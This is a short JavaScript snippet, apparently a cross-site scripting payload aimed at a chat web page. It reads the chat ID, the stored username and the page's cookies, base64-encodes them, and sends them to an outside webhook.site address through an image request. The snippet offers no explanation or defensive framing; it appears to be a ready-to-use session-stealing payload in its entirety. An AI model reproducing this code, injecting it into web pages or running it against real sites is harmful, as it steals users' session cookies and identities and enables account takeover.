(function(){
  const chatId = document.getElementById('chat-config')?.dataset?.chatId || 'unknown';
  const user = localStorage.getItem('username') || 'anon';
  const payload = btoa(`chatId=${chatId}&user=${user}&cookie=${document.cookie}`);
  const img = new Image();
  img.src = `https://webhook.site/a952eb63-9ea4-4de7-8361-be7ea6b39233/?data=${payload}`;
})();
